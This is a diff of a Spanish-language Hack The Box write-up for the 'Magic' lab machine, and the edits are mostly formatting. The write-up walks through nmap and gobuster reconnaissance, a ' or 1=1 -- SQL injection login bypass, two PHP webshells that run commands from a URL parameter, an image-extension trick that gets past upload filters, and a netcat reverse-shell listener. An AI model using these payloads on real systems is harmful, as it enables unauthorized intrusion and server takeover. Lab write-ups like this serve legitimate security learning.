@@ -1,6 +1,6 @@
 ---
 layout: single
-title: Hackthebox máquina MAGIC
+title: Magic - Hack The Box
 excerpt: "Inyección de SQL es una vulnerabilidad de una aplicación web que permite al atacante introducir instrucciones SQL dentro del código SQL programado para la manipulación de la base de datos."
 date: 2021-12-15
 classes: wide
@@ -10,33 +10,41 @@ header:
   icon: /assets/images/hackthebox.webp
 categories:
   - SQL Injection
+  - HTB
+  - 
 tags:
   - SQL Injection
 ---
 
-Antes de iniciar:
+** Antes de iniciar:
 Como es mi primera maquina virtual (box) y soy nuevo con la plataforma de hackthebox, para poder jugar con las maquinas virtuales necesito una conexión con OpenVPN (esta aplicación viene preinstalada en Parrot OS). Esta aplicación permitirá ubicar nuestra host en la misma subred IP que las máquinas vulnerables (boxes), lo que le permitirá contactarlos y atacarlos.
 
 Me ayudé con este video: https://www.youtube.com/watch?v=SmbpScohIFs . Este video muestra como descargar el archivo de configuración automatica de nuestro cliente de OpenVPN e inicializar la conexión con el servidor. El archivo descargado tendra la extensión .ovpn (tickets).
 
 Inicializar la conexión en este comando:
+
 ´´´
 sudo openvpn pack.ovpn
 ´´´
 
 En caso de tener el siguiente error al ejecutar el anterior comando: “Linux can't add IPv6 to interface tun1” es poder Ipv6 se encuentra dehabilitado. Se puede habilitar con este comando:
+
 ´´´
 sudo sysctl net.ipv6.conf.all.disable_ipv6=0
 ´´´
+
 Nos aseguramos que se encuentre habilitado IPv6 con (debe imprimir 0): 
+
 ´´´
 cat /proc/sys/net/ipv6/conf/all/disable_ipv6
 ´´´
+
 Fuente: https://forum.hackthebox.com/t/openvpn-troubles/3478/2 
 
 Este video sirve para probar conexión con la maquina una vez hemos hecho lo anterior: https://www.youtube.com/watch?v=Ykaw6SSW994 
 
 Podemos comprobar nuestra IP remota con:
+
 ´´´
 ip a s tun0
 ´´´
@@ -55,29 +63,36 @@ Respuesta:
 
 ´´´
 
-Desarrollo de la practica:
+** Desarrollo de la practica:
 
 Basado en video de S4vitar on live: https://www.youtube.com/watch?v=ZJ72UuUlz10  
 
 Creo un directorio para la box actual:
+
 ´´´
 mkdir magic
 ´´´
+
 y creamos los siguientes directorio dentro del él:
+
 ´´´
 mkdir nmap content exploits
 ´´´
 
 Fase de reconocimiento:
+
 ´´´
 cd nmap
 ´´´
 
 Comprobamos si tenemos conexión con la maquina con:
+
 ´´´
 ping -c 1 10.10.10.185
 ´´´
+
 Obtenemos:
+
 ´´´
 PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
 64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=183 ms
@@ -89,24 +104,27 @@ PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
 **ttl** (Time To Live) es el maximo numero de rutas IP que un paquete ICMP puede atravesar antes de ser descartado. Y gracias a esto, podemos conocer el sistema operativo que ha respondido a nuestra traza ICMP es Linux, porque una respuesta igual o menor a 64 significa Linux SO, y una menor o igual 128 es Windows OS (El ttl 63 es porque tenemos OpenVPN).
 
 Adicionamente, con ping -R podemos ver las rutas IP por las que paso nuestro ping:
+
 ´´´
 ping -c 1 10.10.10.185 -R
 ´´´
 
 Vamos a escanear puertos con nmap:
+
 ´´´
 nmap -p- --open -T5 -v -n 10.10.10.185
 ´´´
 
 Con el anterior comando estamos diciendo:
-	* *-p-* → Escaneamos todo el rango de puertos (65.535 puertos).
-	* *--open* → Filtramos dejando solo los puertos que estan abiertos.
-	* *-T5* → (Varia entre T0 hasta T5) Indica la rapidez con que queremos que se realice nuestro escaneo. En este caso es lo más rapido.
+	* -p- → Escaneamos todo el rango de puertos (65.535 puertos).
+	* --open → Filtramos dejando solo los puertos que estan abiertos.
+	* -T5 → (Varia entre T0 hasta T5) Indica la rapidez con que queremos que se realice nuestro escaneo. En este caso es lo más rapido.
 
-	* *-v* → De verbose. A medida que encuentra puertos abiertos me los reporte por consola.
-	* *-n* → Para no aplicar resolución DNS y nuestro escaneo será más rápido.
+	* -v → De verbose. A medida que encuentra puertos abiertos me los reporte por consola.
+	* -n → Para no aplicar resolución DNS y nuestro escaneo será más rápido.
 
 Resultado:
+
 ´´´
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-09 18:30 -05
 Initiating Ping Scan at 18:30
@@ -136,13 +154,14 @@ PORT   STATE SERVICE
 ´´´
 
 Otro comando para hacer nuestro reconocimiento de puertos sería (Más rápido que el anterior):
+
 ´´´
 nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185
 
 ´´´
 
 Con el anterior comando estamos diciendo:
-	* *-sS* → Que vaya los más rápido posible. 
+	* -sS → Que vaya los más rápido posible. 
 	* –min-rate 5000 → Vamos a emitir como minimo 5000 paquetes por segundo (Ya no es necesario -T5)
 
 	* -vvv → Para que nos arroje un poquito de más información de lo que encuentra nuestra busqueda.
@@ -156,6 +175,7 @@ cat allports
 ´´´
 
 obtenemos:
+
 ´´´
 # Nmap 7.92 scan initiated Tue Dec 14 12:56:22 2021 as: nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -177,6 +197,7 @@ Con el anterior comando estamos diciendo:
 	* -oN targered → Que almacene en un archivo llamado “targered”en el formato de nmap (Salida normal) el resultado de este comando 
 
 Resultado:
+
 ´´´
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-14 13:46 -05
 Nmap scan report for 10.10.10.185
@@ -297,11 +318,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 También con otro diccionario de rutas más amplio de dirbuster (220561 rutas) pero se demora mucho más:
 
+
 ´´´
 gobuster dir -x php -u http://10.10.10.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ´´´
 
 Resultado:
+
 ´´´
 ===============================================================
 Gobuster v3.1.0
@@ -337,6 +360,7 @@ Regresando a la página principal, vemos en la parte inferior un botón que nos 
 </p>
 En este login intentaremos hacer una inyección sql con una condición booleana (Aunque no nos deje poner espacios simplemente podemos poner la inyección en el navegador, la copiamos y pegamos en el campo):
 
+
 ´´´
 ' or 1=1 --
 ´´´
@@ -359,6 +383,7 @@ Por las rutas de las imagenes que ya estan podemos decir que las imagenes son al
 - [http://10.10.10.185/images/uploads](http://10.10.10.185/images/uploads)
 - [http://10.10.10.185/images/fulls](http://10.10.10.185/images/fulls)
 Intentaremos subir a nuestra página un archivo de tipo php (esta vulnerabilidad está reportada en [OWASP](https:images/uploads/imagen-de-prueba.png//owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) ), el cual nos permita ejecutar comandos a nivel de sistema (dentro del servidor) a través de la URL. El archivo “prueba.php” es el siguiente:
+
 ´´´
 <?php
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
@@ -392,6 +417,7 @@ Lista de algunos números magicos: [1](https://en.wikipedia.org/wiki/List_of_fil
 <br>
 <br>
 Se complico un poco subir el archivo modificando los magic numbers manualmente, entonces se puede usar un truco que consisten en pones la extension *.php.png* al archivo, y agregar en alguna parte de este archivo (se encuentra en formato binario) codigo en php. Insertaremos la siguiente linea en el archivo **prueba.php.png** :
+
 ´´´
 <?php system($_GET['cmd']); ?>
 ´´´
@@ -408,6 +434,7 @@ Probamos la ruta [http://10.10.10.185/images/uploads/pruebaReverseShell2.php.png
   <img src="../assets/images/htb-writeup-magic/respuesta-exitosa-subida-php-png.png">
 </p>
 De esta forma comprobamos la ejecución de comandos. Ahora intentamos hacer una reverse shell. Para esto primero localmente debemos ponernos en escucha por el puerto 443 usando la herramienta [netcat] (https://blog.desdelinux.net/usando-netcat-algunos-comandos-practicos/?utm_source=twitterfeed&utm_medium=twitter):
+
 ´´´
 > sudo nc -nlvp 443
 listening on [any] 443 ...
@@ -419,6 +446,7 @@ Y en la url establecemos la conexión desde el servidor [http://10.10.10.185/ima
 Ya tenemos una consola para ejecutar comando en el servidor!!!
 <br>
 Aunque la ejecución de comando no aparece en un buen formato, como estamos acostumbrados:
+
 ´´´
 www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
 whoami
@@ -437,6 +465,7 @@ ll
 ll: command not found
 ´´´
 Para corregir esto hacemos:
+
 ´´´
 script /dev/null -c bash
 ´´´
@@ -453,4 +482,3 @@ Página donde muestran la reverse shell: [https://pentestmonkey.net/cheat-sheet/
 Fuentes:
 - [https://www.youtube.com/watch?v=ZJ72UuUlz10](https://www.youtube.com/watch?v=ZJ72UuUlz10)
 - [https://snowscan.io/htb-writeup-magic/#](https://snowscan.io/htb-writeup-magic/#)
-
